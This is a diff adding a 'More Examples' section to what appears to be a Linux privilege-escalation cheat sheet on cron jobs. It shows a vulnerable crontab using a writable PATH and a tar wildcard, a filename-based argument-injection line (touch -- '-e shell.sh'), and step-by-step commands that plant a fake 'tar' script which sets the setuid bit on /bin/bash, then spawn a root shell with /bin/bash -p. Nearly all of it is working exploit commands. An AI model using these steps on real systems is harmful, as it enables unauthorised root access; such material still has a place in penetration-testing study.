@@ -64,5 +64,28 @@
 
     touch -- '-e shell.sh'
 
+## More Examples:
 
+Steps to exploit the example crontabs
 
+Example vulnerable crontab
+
+    #!/bin/sh
+    export PATH="/home/USER/restapi:$PATH"
+    cd /home/USER/restapi
+    tar czf /tmp/flask.tar.gz *
+
+### 1) Create a bash script that gives the bash binary the sticky bit
+
+tar (script name)
+
+    #!/bin/bash
+    chmod u+s /bin/bash
+
+### 2) Add it to the directory where the cronjob accesses it
+
+    cp tar /home/USER/restapi/tar
+
+### 3) Wait for the crontab to execute, then run the bash binary for root
+
+    /bin/bash -p
